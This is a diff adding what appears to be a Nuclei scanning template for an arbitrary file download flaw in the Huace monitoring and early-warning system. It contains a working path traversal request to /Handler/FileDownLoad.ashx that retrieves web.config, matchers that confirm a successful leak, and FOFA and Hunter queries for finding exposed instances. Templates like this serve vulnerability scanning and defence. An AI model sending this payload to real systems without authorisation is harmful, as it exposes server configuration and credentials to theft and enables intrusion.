@@ -1,0 +1,35 @@
+id: huace-handler-filedownload
+
+info:
+  name: 华测监测预警系统任意文件下载
+  author: SleepingBag945
+  severity: high
+  description: |-
+    上海华测导航技术股份有限公司的华测监测预警系统可下载任意文件，如web.config文件等。
+    FOFA: app="华测监测预警系统2.2"
+    HUNTER: app.name="华测监测预警系统"
+  tags: huace
+
+http:
+  - raw:
+      - |
+        POST /Handler/FileDownLoad.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        filename=1&filepath=..%2F..%2Fweb.config
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'configuration'
+          - 'appSettings'
+          - 'SkinId'
+          - 'AppId'
+          - 'SysName'
+          - 'SysNameEn'
+        condition: and
